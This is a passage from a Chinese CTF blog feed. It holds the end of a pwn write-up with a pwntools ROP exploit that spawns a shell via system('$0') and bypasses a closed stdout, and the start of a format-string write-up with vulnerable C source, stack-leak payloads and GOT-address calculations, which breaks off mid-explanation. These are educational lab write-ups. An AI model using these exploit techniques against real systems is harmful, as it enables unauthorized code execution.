<code>system(&quot;$0&quot;)</code> è·å–äº† shellï¼Œä½†æ˜¯ <code>ls</code>ã€<code>cat</code> ç­‰æŒ‡ä»¤æ˜¯æ— æ³•ä½¿ç”¨çš„</p><p>å› ä¸ºè¿™äº›æŒ‡ä»¤éƒ½éœ€è¦ä½¿ç”¨åˆ° Linux çš„æ ‡å‡†è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯ <code>fd = 1</code>ï¼Œè€Œè¿™é‡Œä½¿ç”¨ <code>close(1)</code> å…³é—­äº†æ ‡å‡†è¾“å‡º</p><p>ä½†æ˜¯å¯ä»¥é€šè¿‡é‡å®šå‘æ¥ç»•è¿‡ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®ç°é‡å®šå‘ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token file-descriptor important">&amp;2</span>   <span class="token comment"># ä¹Ÿå¯ä»¥ç®€å†™ä¸ºï¼šexec >&amp;2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd10.png" alt="PWN-è“æ¡¥æ¯2024_fd10.png"></p><p>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸ä½¿ç”¨ <code>exec 1&gt;&amp;2</code>ï¼Œè€Œæ˜¯ç›´æ¥æ‰§è¡ŒæŒ‡ä»¤ï¼Œä¾‹å¦‚ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">whoami</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token file-descriptor important">&amp;2</span>   <span class="token comment"># ä¹Ÿå¯ä»¥ç®€å†™ä¸ºï¼šwhoami >&amp;2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd11.png" alt="PWN-è“æ¡¥æ¯2024_fd11.png"></p><blockquote><p>ä¸€äº›é‡å®šå‘çš„çŸ¥è¯†ï¼š</p><p><code>1&gt;&amp;2</code>ï¼šæŠŠæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†é”™è¯¯<br><code>2&gt;&amp;1</code>ï¼šæŠŠæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º<br><code>&amp;&gt;filename</code>ï¼šæŠŠæ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºéƒ½é‡å®šå‘åˆ°æ–‡ä»¶ filename ä¸­</p><p>ä¾‹å¦‚å¸¸è§çš„é‡å®šå‘ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"xxx"</span> <span class="token operator">></span> filename.txt <span class="token comment"># æŠŠ "xxx" å†™å…¥åˆ° filename.txt æ–‡ä»¶ä¸­</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><hr><h1 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># è®¾ç½®ç³»ç»Ÿæ¶æ„, æ‰“å°è°ƒè¯•ä¿¡æ¯</span><span class="token comment"># arch å¯é€‰ : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN è¿œç¨‹ : content = 0, PWN æœ¬åœ° : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># å°†æœ¬åœ°çš„ Linux ç¨‹åºå¯åŠ¨ä¸ºè¿›ç¨‹ io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># è¿œç¨‹ç¨‹åºçš„ IP å’Œç«¯å£å·</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"47.93.142.240"</span><span class="token punctuation">,</span> <span class="token number">44180</span><span class="token punctuation">)</span><span class="token comment"># é™„åŠ  gdb è°ƒè¯•</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># åªæœ‰æœ¬åœ°æ‰å¯è°ƒè¯•ï¼Œè¿œç¨‹æ— æ³•è°ƒè¯•</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"restricted stack.\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'$0\x00'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>info_addr <span class="token operator">=</span> <span class="token number">0x601090</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400933</span>ret <span class="token operator">=</span> <span class="token number">0x4005ae</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_plt --->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>info_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># ä¸è¿œç¨‹äº¤äº’</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd12.png" alt="PWN-è“æ¡¥æ¯2024_fd12.png"></p>]]></content>
    
    
    <summary type="html">æ€è·¯æ˜¯å¸¸è§çš„ ROPï¼Œä½†æ˜¯é™åˆ¶äº† system() çš„å‚æ•°ï¼Œæ— æ³•ä½¿ç”¨ &quot;/bin/sh&quot;ã€&quot;sh&quot;ã€&quot;cat flag&quot; ä¹‹ç±»çš„æ“ä½œï¼Œä½†å¯ä»¥é€šè¿‡ system(&quot;$0&quot;) å®ç°ç›¸åŒçš„æ•ˆæœï¼ŒåŒæ—¶åˆ©ç”¨ exec 1&gt;&amp;2 é‡å®šå‘ç»•è¿‡ close(1)</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>ã€ä½ æƒ³æœ‰å¤šPWNã€‘fmt_test2</title>
    <link href="https://www.uf4te.cn/posts/ba83bd5d.html"/>
    <id>https://www.uf4te.cn/posts/ba83bd5d.html</id>
    <published>2024-04-22T11:39:42.000Z</published>
    <updated>2024-06-05T06:36:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ”¶è·"><a href="#æ”¶è·" class="headerlink" title="æ”¶è·"></a>æ”¶è·</h1><ul><li><p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²æ ˆä¸­çš„æ•°æ®ï¼Œåˆ¤æ–­è¾“å…¥çš„æ•°æ®ä½äºæ ˆç©ºé—´çš„å“ªä¸ªä½ç½®</p></li><li><p><mark>åœ¨ç¨‹åºå¼€å¯ PIE æ—¶ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²æ ˆä¸Šçš„çœŸå®è¿”å›åœ°å€ï¼Œç„¶åæ ¹æ® ELF æ–‡ä»¶ä¸­å‡½æ•°çš„åç§»æ¨ç®—å‡ºå…¶ä»–å‡½æ•°çš„çœŸå®åœ°å€</mark></p></li><li><p>æ ¹æ®å·²ç»æ³„éœ²çš„çœŸå®åœ°å€ï¼Œåˆ©ç”¨ libc åç§»è®¡ç®— <code>system()</code> å’Œ <code>b&#39;/bin/sh&#39;</code> çš„åœ°å€</p></li><li><p>ä½¿ç”¨ Pwntools ä¸­çš„ <code>fmtstr_payload()</code> æ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åˆ©ç”¨ï¼Œå°† <code>printf()</code> çš„ GOT è¡¨åœ°å€ä¿®æ”¹ä¸º <code>system_plt</code></p></li><li><p><mark>æ³¨æ„ 32 ä½ç¨‹åºä¸ 64 ä½ç¨‹åºåœ¨ä½¿ç”¨ <code>%å‚æ•°é¡ºåº$æ ¼å¼åŒ–è¯´æ˜ç¬¦</code> è¿›è¡Œåœ°å€æ³„éœ²æ—¶çš„åŒºåˆ«</mark></p></li></ul><hr><h1 id="fmt-str-level-1-x86"><a href="#fmt-str-level-1-x86" class="headerlink" title="fmt_str_level_1_x86"></a>fmt_str_level_1_x86</h1><p>æºä»£ç å¦‚ä¸‹ï¼šï¼ˆè¿™é‡Œ gcc ç¼–è¯‘æ—¶ä½¿ç”¨ <code>-z lazy</code> æ¥å®ç° Partial RELROï¼‰</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">dofunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"quit"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dofunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//gcc fmt_str_level_1.c -z lazy -o fmt_str_level_1_x64</span><span class="token comment">//gcc -m32 fmt_str_level_1.c -z lazy -o fmt_str_level_1_x86</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿˜æ˜¯è€è§„çŸ©ï¼Œå…ˆç†Ÿæ‚‰ä¸€ä¸‹ IDAï¼šï¼ˆè™½ç„¶ç»™äº†æºä»£ç hhhï¼‰</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_1.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_2.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_3.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_3.png"></p><p>æ˜æ˜¾åœ¨ <code>printf(buf)</code> å¤„å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p>çœ‹ä¸€çœ¼ä¿æŠ¤ï¼Œ32 ä½å°ç«¯åºï¼ŒRELRO å¼€äº†ä¸€åŠï¼Œå…¶ä½™å…¨å¼€ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_4.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_4.png"></p><blockquote><p>ç”±äºè¿™é‡Œæœ‰ä¸ª while å¾ªç¯ä¸€ç›´è°ƒç”¨ printf å‡½æ•°ï¼Œä¸” RELRO ä¸º Partial RELROï¼Œå› æ­¤å¯ä»¥è€ƒè™‘å°† <code>printf()</code> çš„ GOT è¡¨åœ°å€ä¿®æ”¹ä¸º <code>system_plt</code>ï¼Œç„¶åè°ƒç”¨ <code>printf()</code> è¾“å‡º <code>b&#39;/bin/sh&#39;</code> å³å¯å®ç° <code>system(&quot;/bin/sh&quot;)</code></p></blockquote><p>ä½†æ˜¯ç”±äºç¨‹åºå¼€å¯äº† PIE åœ°å€éšæœºåŒ–ï¼Œå› æ­¤ <code>printf()</code> çš„ GOT è¡¨åœ°å€æœªçŸ¥ï¼Œä¹Ÿä¸çŸ¥é“å…¶ä»–ä»»ä½•å‡½æ•°çš„çœŸå®åœ°å€</p><p>æ‰€ä»¥é¦–å…ˆæ€è·¯å°±æ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥æ³„éœ²ä¸€äº›åœ°å€</p><hr><h2 id="å®šä½å¹¶æ³„éœ²æ ˆä¸­çš„æ•°æ®"><a href="#å®šä½å¹¶æ³„éœ²æ ˆä¸­çš„æ•°æ®" class="headerlink" title="å®šä½å¹¶æ³„éœ²æ ˆä¸­çš„æ•°æ®"></a>å®šä½å¹¶æ³„éœ²æ ˆä¸­çš„æ•°æ®</h2><p>é¦–å…ˆ gdb è°ƒè¯• <code>fmt_str_level_1_x86</code> ç¨‹åºï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_5.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_5.png"></p><p>æ‰§è¡Œåˆ° <code>read()</code> è¾“å…¥çš„åœ°æ–¹ï¼Œè¾“å…¥ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">aaaa_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_6.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_6.png"></p><p>æ‰§è¡Œåˆ° <code>printf()</code> å¤„è§‚å¯Ÿè¾“å‡ºç»“æœï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_7.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_7.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">aaaa_0x5655700f_0x4_0x565562e5_0xf7ffd000_0x20_</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span>_0x61616161_0x5f70255f_0x255f7025_0x70255f70_0x5f70255f_0x255f7025ï¿½ï¿½ï¿½Tï¿½ï¿½ï¿½<span class="token number">4</span>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½tVï¿½ï¿½\ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<span class="token number">0x5655634f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ° <code>0x61616161</code> å°±æ˜¯åˆšåˆšè¾“å…¥çš„ <code>aaaa</code>ï¼Œä½äºç¬¬ 7 ä¸ªä½ç½®</p><p>å¯ä»¥é€šè¿‡æŸ¥çœ‹æ ˆæ¥éªŒè¯ä¸€ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_8.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_8.png"></p><blockquote><p>ç”±äºéœ€è¦æ³„éœ²çœŸå®åœ°å€ï¼Œè¿™é‡Œé€‰æ‹©æ³„éœ²æ ˆä¸Šçš„è¿”å›åœ°å€ï¼ˆ<strong>é€šå¸¸é€‰æ‹©è¿”å›åœ°å€ï¼Œä¸ä¼šå—æ ˆä¸­çš„æ•°æ®å½±å“</strong>ï¼‰</p></blockquote><p>æ‰¾åˆ° EBP æ‰€åœ¨ä½ç½®ï¼Œç”±äºæ ˆç©ºé—´æ¯”è¾ƒé•¿ï¼Œè¿™é‡Œä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> stack <span class="token number">100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_9.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_9.png"></p><p>å¯ä»¥çœ‹åˆ° EBP ä½äº <code>0xffffcdb8</code> åœ°å€å¤„ï¼Œæ ˆçš„è¿”å›åœ°å€ç´§éšå…¶åä½äº <code>0xffffcdbc</code> åœ°å€å¤„ï¼Œå¾—çŸ¥è¿”å›åœ°å€ <code>main+30</code> çš„åœ°å€ä¸ºï¼š<code>0x5655638e</code></p><blockquote><p>æ³¨æ„ï¼šç”±äºç¨‹åºå¼€å¯äº† PIEï¼Œè¿™é‡Œçœ‹åˆ°çš„ <code>main+30</code> çš„åœ°å€å…¶å®æ˜¯éšæœºçš„ï¼Œä¸è¿‡ï¼Œä¸è®ºåœ°å€æ€ä¹ˆå˜ï¼Œæ ˆçš„ç»“æ„æ˜¯ä¸ä¼šå˜çš„ï¼ˆ<em>è™½ç„¶åœ°å€æ˜¯éšæœºçš„ï¼Œä½†ç”±äºæ“ä½œç³»ç»Ÿçš„åˆ†é¡µç®¡ç†æœºåˆ¶ï¼Œåœ°å€çš„æœ€ä½ä¸‰ä½é€šå¸¸æ˜¯ä¸å˜çš„</em>ï¼‰</p><p>å› æ­¤ï¼Œå¯ä»¥é€šè¿‡è®¡ç®— <code>main+30</code> åœ¨æ ˆä¸­çš„ä½ç½®ï¼Œç„¶ååˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°†å…¶æ³„éœ²å‡ºæ¥</p></blockquote><p>åˆšåˆšå¾—çŸ¥è¾“å…¥çš„ <code>aaaa</code> ä½äºæ ˆä¸­çš„ç¬¬ 7 ä¸ªä½ç½®ï¼Œå­˜æ”¾åœ¨åœ°å€ <code>0xffffccac</code> å¤„</p><p>è®¡ç®—å¯çŸ¥ <code>main+30</code> æ‰€åœ¨ä½ç½®ä¸ <code>aaaa</code> ç›¸è·ï¼š<code>(0xffffcdbc - 0xffffccac) / 4 = 68</code></p><p>æ‰€ä»¥ <code>main+30</code> åœ¨æ ˆä¸­ä½äºç¬¬ <code>68 + 7 = 75</code> ä¸ªä½ç½®ï¼Œæ„é€  <code>printf(%75$p)</code> å³å¯å°†å…¶æ³„éœ²</p><p>éªŒè¯ä¸€ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_10.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_10.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_11.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_11.png"></p><p>æ³„éœ²å‡ºæ¥çš„åœ°å€ä¸ <code>main+30</code> çš„åœ°å€ <code>0x5655638e</code> ä¸€è‡´</p><p>äºæ˜¯ï¼Œå°† <code>printf(%75$p)</code> æ³„éœ²å‡ºæ¥çš„åœ°å€å‡å» 30 å°±å¯ä»¥å¾—åˆ°çœŸå®çš„ main å‡½æ•°åœ°å€äº†ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'input:\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'%75$p'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ret_main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ret_main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> ret_main_addr <span class="token operator">-</span> <span class="token number">30</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="åˆ©ç”¨-ELF-çš„å‡½æ•°åç§»è®¡ç®—çœŸå®åœ°å€"><a href="#åˆ©ç”¨-ELF-çš„å‡½æ•°åç§»è®¡ç®—çœŸå®åœ°å€" class="headerlink" title="åˆ©ç”¨ ELF çš„å‡½æ•°åç§»è®¡ç®—çœŸå®åœ°å€"></a>åˆ©ç”¨ ELF çš„å‡½æ•°åç§»è®¡ç®—çœŸå®åœ°å€</h2><blockquote><p>ç”±äº ELF æ–‡ä»¶ä¸­å‡½æ•°ä¹‹é—´çš„åç§»ä¸å˜ï¼Œæ‰€ä»¥ <code>elf.symbols[&quot;main&quot;] - elf.got[&quot;puts&quot;]</code> åº”è¯¥ä¸çœŸå®çš„ <code>main_addr - puts_got_addr</code> ç›¸åŒ</p><p>è€ŒçœŸå®çš„ <code>main_addr</code> å·²ç»é€šè¿‡å‰é¢çš„æ³„éœ²å’Œè®¡ç®—å¾—çŸ¥äº†ï¼Œå› æ­¤å¯ä»¥è®¡ç®—å‡º <code>puts_got_addr</code></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x86"</span><span class="token punctuation">)</span>main_puts_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_puts_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äºæˆ‘ä»¬è¦ä½¿ç”¨ <code>fmtstr_payload()</code> å°† <code>printf()</code> çš„ GOT è¡¨åœ°å€ä¿®æ”¹ä¸º <code>system_plt</code>ï¼Œå› æ­¤è¿˜éœ€è¦å¾—åˆ° <code>printf_got_addr</code></p><p>è®¡ç®—æ–¹æ³•ä¸ <code>puts_got_addr</code> ä¸€æ ·ï¼Œåˆ©ç”¨ ELF çš„å‡½æ•°åç§»è®¡ç®—å³å¯ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">main_printf_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>printf_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_printf_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 